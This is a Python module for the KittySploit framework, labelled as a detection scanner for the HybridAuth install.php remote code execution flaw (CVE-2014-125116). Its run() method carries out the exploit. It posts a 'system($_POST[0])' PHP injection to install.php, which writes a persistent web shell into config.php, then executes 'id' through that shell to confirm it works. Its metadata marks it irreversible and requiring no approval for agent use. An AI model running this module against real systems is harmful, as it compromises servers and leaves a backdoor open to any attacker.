#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HybridAuth install.php / config.php RCE (CVE-2014-125116)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HybridAuth - install.php RCE Detection (CVE-2014-125116)',
        'description': (
            'Detects HybridAuth installer RCE by writing system($_POST[0]) into config '
            'via install.php then POSTing 0=id to config.php.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'hybridauth', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-125116',
        ],
        'cve': 'CVE-2014-125116',
    }

    def run(self):
        for base in ('/hybridauth', '/auth', '/social', ''):
            install = f'{base}/install.php'
            r0 = self.http_request(method='GET', path=install, allow_redirects=False)
            if not r0 or 'HybridAuth Installer' not in (r0.text or ''):
                continue
            self.http_request(
                method='POST',
                path=install,
                data='OPENID_ADAPTER_STATUS=system($_POST[0]))));/*',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            r = self.http_request(
                method='POST',
                path=f'{base}/config.php',
                data='0=id',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='HybridAuth install.php RCE (CVE-2014-125116)',
                    path=install,
                )
                return True
        return False
